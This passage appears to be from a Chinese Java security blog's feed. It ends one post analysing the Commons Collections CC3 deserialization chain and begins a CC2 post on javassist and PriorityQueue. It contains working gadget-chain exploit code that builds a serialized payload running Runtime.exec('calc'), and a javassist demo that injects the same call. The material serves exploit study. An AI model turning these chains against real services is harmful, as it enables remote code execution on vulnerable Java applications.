class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用TransformedMap链作为序列化入口</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(obj);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-8.png" title="执行实现"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>主要还是变式吧，cc1和cc2的结合，并找到了新的两个类<code>TrAXFilter</code>、<code>InstantiateTransformer</code>串联进行执行，采用cc1的LazyMap和cc2的字节码实例化，相对理解起来轻松很多，同理也可以使用cc1的TransformedMap利用链改变入口点，进行再次变式，原理上差不多，接着后面链学习吧。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections-3">https://paper.seebug.org/1242/#commons-collections-3</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC2链学习与分析</title>
      <link href="/posts/7e30cd4a.html"/>
      <url>/posts/7e30cd4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。<br>这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-yso链学习与分析</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（要求java8以上）<br>Commons Collections：4.0（漏洞版本）（在3版本中<code>TransformingComparator</code>类未实现序列化接口所以不存在该利用链，4版本才实现）<br>javassist：3.20.0-GA<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、利用链基础前提"><a href="#0x03、利用链基础前提" class="headerlink" title="0x03、利用链基础前提"></a>0x03、利用链基础前提</h1><h2 id="javassist字节码增强类"><a href="#javassist字节码增强类" class="headerlink" title="javassist字节码增强类"></a>javassist字节码增强类</h2><p>Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</p><blockquote><p>引用官网的描述：<br>Javassist（Java编程助手）使Java字节码操作变得简单。它是一个用于在Java中编辑字节码的类库；它使Java程序能够在运行时定义一个新类，并在JVM加载时修改类文件。与其他类似的字节码编辑器不同，Javassist提供了两级API：源代码级和字节码级。如果用户使用源代码级API，他们可以在不知道Java字节码规范的情况下编辑类文件。整个API仅使用Java语言的词汇表设计。您甚至可以以源文本的形式指定插入的字节码；Javassist实时编译。另一方面，字节码级API允许用户像其他编辑器一样直接编辑类文件。</p></blockquote><p>由于<code>java</code>运行通常由<code>java</code>文件编译成<code>class</code>文件供<code>jvm</code>运行，更改代码内容需要重新编写<code>java</code>文件再编译成<code>class</code>文件运行。<br><strong><code>Javassist</code>作用就是动态修改<code>.class</code>文件内容</strong>，且不需要知道<code>jvm</code>相关指令调用，<code>javassist</code>的引用能更简单快速的修改<code>class</code>文件的内容。</p><p>实现的效果有点类似反射的调用方式，不过一个是更改字节文件，反射是调用类，目的不同。</p><p><strong>涉及的类</strong></p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool：<br>基于哈希表(Hashtable)实现的CtClass对象容器，其中键是类名称, 值是表示该类的CtClass对象，同HashMap实现的Map接口，但不同于哈希表(Hashtable)的键名不能为null。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">getDefault()</td><td align="left">返回默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）</td></tr><tr><td align="left">insertClassPath(java.lang.String pathname)</td><td align="left">在搜索路径的开头插入目录或jar（或zip）文件</td></tr><tr><td align="left">insertClassPath(ClassPath cp)</td><td align="left">在搜索路径的开头插入类对象，当用户系统存在多个类加载器，默认加载getDefault()搜索不到加载类可使用该方法添加路径</td></tr><tr><td align="left">getClassLoader()</td><td align="left">获得类加载器</td></tr><tr><td align="left">get(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用</td></tr><tr><td align="left">getOrNull(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用，未找到该文件返回null，不抛出异常</td></tr><tr><td align="left">appendClassPath(ClassPath cp)</td><td align="left">将ClassPath对象附加到搜索路径的末尾</td></tr><tr><td align="left">makeClass(java.lang.String classname)</td><td align="left">创建一个新的public类</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">setSuperclass(CtClass clazz)</td><td align="left">添加父类</td></tr><tr><td align="left">setInterfaces</td><td align="left">添加父类接口</td></tr><tr><td align="left">toClass(java.lang.invoke.MethodHandles.Lookup lookup)</td><td align="left">将此类转换为java.lang.Class对象</td></tr><tr><td align="left">toBytecode()</td><td align="left">将该类转换为类文件，对象类型为byte[]</td></tr><tr><td align="left">writeFile()</td><td align="left">将由此CtClass 对象表示的类文件写入当前目录</td></tr><tr><td align="left">writeFile(java.lang.String directoryName)</td><td align="left">将由此CtClass 对象表示的类文件写入本地磁盘</td></tr><tr><td align="left">makeClassInitializer()</td><td align="left">制作一个空的类初始化程序（静态构造函数），对象类型为CtConstructor</td></tr><tr><td align="left">detach</td><td align="left">将CtClass对象从ClassPool池中删除</td></tr><tr><td align="left">freeze</td><td align="left">冻结一个类，使其变为不可修改状态</td></tr><tr><td align="left">isfreeze</td><td align="left">判断该类是否存于冻结状态</td></tr><tr><td align="left">prune</td><td align="left">删除类不必要的属性，减少内存占用</td></tr><tr><td align="left">deforst</td><td align="left">解冻一个类，使其变为可修改状态</td></tr><tr><td align="left">addField</td><td align="left">添加字段</td></tr><tr><td align="left">addMethod</td><td align="left">添加方法</td></tr><tr><td align="left">addConstructor</td><td align="left">添加构造器</td></tr><tr><td align="left">addInterface</td><td align="left">添加接口</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法 效果相同</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新方法</span></span><br><span class="line">        ct.addMethod(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtMethods"><a href="#CtMethods" class="headerlink" title="CtMethods"></a>CtMethods</h3><p>表示类中的方法</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">insertBefore</td><td align="left">在方法起始位置插入代码</td></tr><tr><td align="left">insterAfter</td><td align="left">在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception</td></tr><tr><td align="left">insertAt</td><td align="left">在指定位置插入代码</td></tr><tr><td align="left">setBody</td><td align="left">将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除</td></tr><tr><td align="left">make</td><td align="left">创建一个方法</td></tr><tr><td align="left">addParameter</td><td align="left">添加参数</td></tr><tr><td align="left">setName</td><td align="left">设置方法名</td></tr></tbody></table><p>注:插入的代码必须是完整的代码语句，包括分号结束语。</p><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对类的方法进行操作</span></span><br><span class="line">        CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-1.png" title="实现方法"></p><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>表示类中的构造函数<br>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;Exp2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="生成字节码toBytecode"><a href="#生成字节码toBytecode" class="headerlink" title="生成字节码toBytecode()"></a>生成字节码toBytecode()</h3><p>生成字节码：CtClass.toBytecode()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成字节码</span></span><br><span class="line"><span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"><span class="comment">//输出字节码</span></span><br><span class="line">String str=Arrays.toString(bt);</span><br><span class="line">System.out.print(str);</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-4.png" title="toBytecode()"></p><h3 id="生成对象toClass"><a href="#生成对象toClass" class="headerlink" title="生成对象toClass()"></a>生成对象toClass()</h3><p>反射调用对象:CtClass.toClass()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用对象</span></span><br><span class="line">Class cla=ct.toClass();</span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line">Object o=cla.newInstance();</span><br></pre></td></tr></table></figure><h3 id="简单实现demo"><a href="#简单实现demo" class="headerlink" title="简单实现demo"></a>简单实现demo</h3><p>实例类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String addr;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.name=name;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddr</span><span class="params">(String addr)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.addr=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">       ct.defrost();</span><br><span class="line">       ct.writeFile(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>实现更改字节码效果：</p><p><img src="/posts/7e30cd4a/cc2-2.png" title="实现效果"></p><p>触发恶意代码效果demo:<br>通过向构造函数插入执行代码，通过反射调用CtClass对象并转换为反射类对象，进行实例化的时候调用构造函数触发恶意代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">       <span class="comment">//ct.writeFile(&quot;People2&quot;);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//通过反射调用对象</span></span><br><span class="line">       Class cla=ct.toClass();</span><br><span class="line">       <span class="comment">//实例化对象</span></span><br><span class="line">       Object o=cla.newInstance();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-3.png" title="恶意代码实现效果"></p><h2 id="PriorityQueue优先级队列"><a href="#PriorityQueue优先级队列" class="headerlink" title="PriorityQueue优先级队列"></a>PriorityQueue优先级队列</h2><blockquote><p>PriorityQueue类在Java1.5中引入。PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator（比较器）在队列实例化的时排序。要求使用Java Comparable和Comparator接口给对象排序，并且在排序时会按照优先级处理其中的元素。</p></blockquote><p>顾名思义，它是队列的一种实现方式，但不同于普通队列Queue（先进先出），它可通过比较器Comparator实现数据之间谁排在前面谁排在后面（上沉该元素）。</p><p>PriorityQueue队列常用方法：</p><ul><li>add()：添加数组元素，添加失败会抛出异常。</li><li>offer()：添加数组元素，添加失败会返回false。</li><li>poll()：取出队顶数组元素，并删除该元素，失败会抛出异常。</li><li>peek()：查询队顶数组元素，但不删除该元素。</li><li>remove(): 取出队顶数组元素，并删除该元素，失败会返回null。</li></ul><p>PriorityQueue队列实现用法：</p><ul><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;(); &#x2F;&#x2F;默认优先级队列，规则从小到大</Integer></li><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;( (a,b)-&gt;(b-a)); &#x2F;&#x2F;设置比较器，从大到小排列</Integer></li></ul><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//默认优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//设置了比较规则的优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq2=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;( (a,b)-&gt;(b-a));</span><br><span class="line"></span><br><span class="line">        pq.add(<span class="number">3</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出，默认从小到大</span></span><br><span class="line">        System.out.print(<span class="string">&quot;默认优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        pq2.add(<span class="number">3</span>);</span><br><span class="line">        pq2.add(<span class="number">1</span>);</span><br><span class="line">        pq2.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出</span></span><br><span class="line">        System.out.print(<span class="string">&quot;设置比较器优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq2.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-13.png" title="优先级队列"></p><p>自定义使用方法：</p><ul><li>类实现了Comparable接口，定义了比较方法，直接使用即可PriorityQueue&lt;类名&gt; queue&#x3D;new PriorityQueue&lt;&gt;();</li><li>当传递对象元素未实现Comparable接口，可自定义新Comparable<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="comment">////判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li></ul><p>其中进行判断的比较器参数o1,o2，其中o1表示新插入的元素，o2表示被比较的元素也就是插入的前面一个元素。其中最后return 1表示当前比较的两个元素顺序正确，-1表示顺序不正确，不正确后将新插入的元素进行上沉操作（也就是向前排），然后循环比较上沉后的前面一个元素，继续判断直到顺序正确。</p><p><img src="/posts/7e30cd4a/cc2-14.png" title="参数描述"></p><p>简单实现效果：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        